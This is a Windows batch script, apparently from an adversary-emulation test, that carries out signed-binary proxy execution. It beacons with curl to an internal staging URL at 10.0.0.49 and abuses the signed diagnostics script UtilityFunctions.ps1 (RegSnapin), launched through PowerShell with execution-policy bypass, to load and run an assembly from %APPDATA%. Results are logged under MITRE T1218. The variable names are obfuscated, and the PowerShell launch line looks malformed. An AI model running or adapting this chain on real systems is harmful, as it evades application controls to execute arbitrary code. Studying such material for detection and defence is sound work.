@echo off
SETLOCAL ENABLEDELAYEDEXPANSION
SET pjkcpgw=%APPDATA%\9440\9ba0b109
SET ebwae=https://10.0.0.49
SET drguvr=https://10.0.0.49/stage/2/icon.png?9440-7
SET hlbnp=ITZEL-S2B
SET pudaazx=7
SET syjfr=expressvp.txt
SET ewjmdkff=9440

SET yqndt=%APPDATA%\!pudaazx!
SET xikjh=%yqndt%\macula-simulations.log

echo [%DATE% %TIME%][DEBUG][!hlbnp!]: heartbeat_start>> "!xikjh!" 2>nul
curl -k -s -o nul "!drguvr!"
echo [%DATE% %TIME%][DEBUG][!hlbnp!]: heartbeat_complete>> "!xikjh!" 2>nul

echo [%DATE% %TIME%][DEBUG][!hlbnp!]: chdir_start>> "!xikjh!" 2>nul
cd /d c:\windows\diagnostics\system\networking
echo [%DATE% %TIME%][DEBUG][!hlbnp!]: chdir_complete>> "!xikjh!" 2>nul

echo [%DATE% %TIME%][DEBUG][!hlbnp!]: powershell_start>> "!xikjh!" 2>nul
SET fijbn=0
SET npzpx=
%SystemRoot%\Microsoft.NET\Framework64\v4.0.30319\UtilityFunctions.ps1 powershell.exe -ep bypass -command "set-location -path c:\windows\diagnostics\system\networking; import-module .\UtilityFunctions.ps1; RegSnapin !pjkcpgw!\\!syjfr!;[Program.Class]::Dale()"
IF !ERRORLEVEL! EQU 0 (
    SET fijbn=1
) ELSE (
    SET npzpx=assembly_load_failed
)
echo [%DATE% %TIME%][DEBUG][!hlbnp!]: powershell_complete>> "!xikjh!" 2>nul

SET log_year=%DATE:~10,4%
SET log_month=%DATE:~4,2%
SET log_day=%DATE:~7,2%
SET log_time=%TIME%
IF "!log_time:~0,1!"==" " SET log_time=0!log_time:~1!
SET timestamp=!log_year!-!log_month!-!log_day! !log_time:~0,2!:!log_time:~3,2!:!log_time:~6,5!
echo [!timestamp!][!hlbnp!]: !pudaazx!-!ewjmdkff!-T1218|Signed_Binary_Proxy_Execution=!fijbn!:!npzpx!>> "!xikjh!" 2>nul